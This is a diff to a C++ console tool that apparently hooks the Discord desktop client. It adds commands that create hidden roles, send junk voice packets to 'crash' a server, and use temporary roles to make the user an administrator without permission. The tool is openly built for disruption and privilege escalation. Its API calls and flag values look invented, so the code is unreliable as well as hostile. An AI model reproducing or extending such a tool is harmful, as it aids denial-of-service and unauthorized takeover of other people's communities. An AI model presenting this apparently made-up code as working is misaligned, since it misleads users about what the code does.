@@ -1,8 +1,18 @@
 #include "includes.hpp"
 
+/*
+* WARNING: This software was designed for use on Windows 10, x64 bit systems.
+* In order to fix errors, change build settings accordingly. Viewing MS DOCS
+* may come in handy, if you cannot fix the error, make an issue.
+*
+* Majority of this file written by sand
+*/
+
+// xor?
 
 int main()
 {
+    printf("[!] NOTICE: In order to target a specific discord server, please make sure you are inside of one of its text channels.\r\n\r\n");
     if (UI::Controls::GrabInput("[#] Press any key to begin, make sure Discord is completely started up and you are on the homepage...") )
     {
         if(!AttachElectron("discord.exe"))
@@ -20,6 +30,7 @@ int main()
         
         DiscordUser user = electron.getInterface("localdata_u");
         
+        // Love spaghetti code 🍝 YUM!
         while(bShell)
         {
             if(szInput == "help") {
@@ -37,7 +48,7 @@ int main()
                     continue;
                 }
                 
-                user.create_role(szInput, DISCORDFLAG_DEBUGROLE);   // flag: 0x67
+                user.create_role(szInput, DISCORDROLEFLAG_DEBUGROLE);   // flag: 0x67
                     
                 printf("Role hidden.\r\n")
             }
@@ -50,8 +61,13 @@ int main()
                 
                 std::string junk_data = GenerateJunk(1024);
                 
-                user.sendpkt(voip, junk_data, 0x9);
-                printf("Tried to crash server.\r\n")
+                user.sendpkt(
+                    voip,
+                    junk_data,
+                    0x9 // fools!
+                );
+                
+                printf("Tried to crash server.\r\n");
             }
             else if(szInput == "u2m")
             {
@@ -63,7 +79,30 @@ int main()
                     😀
                 */
                 
-                // will release later
+                DiscordGuild guild = electron.getInterface("guild");
+                
+                if(user.priv_check(DISCORDPERMFLAG_ADMINISTRATOR))
+                {   
+                    printf("You are already a moderator in this server!\r\n");
+                    continue;
+                }
+                
+                // discord added 'temp' roles for some reason, we exploit this. make sure expiry never over 6 hrs!
+                user.create_temp_role( 
+                    3600, 
+                    "usertomodbot",
+                    DISCORDROLEFLAG_DEBUGROLE
+                ); // -- create_temp_role(expiry_in_secs: uint32_t, role_name: const char*, role_flags)-- //
+                
+                // assign_role is for assigning temporary roles
+                user.assign_role(
+                    user, 
+                    "usertomodbot", 
+                    1,
+                    3603 // must add expiry_time + 3
+                );
+                
+                printf("You should be admin for around an hour now.\r\n");
             }
             else {
                 printf("`%s` is not a recognized command. Try 'help' for help.\r\n", szInput.c_str());   
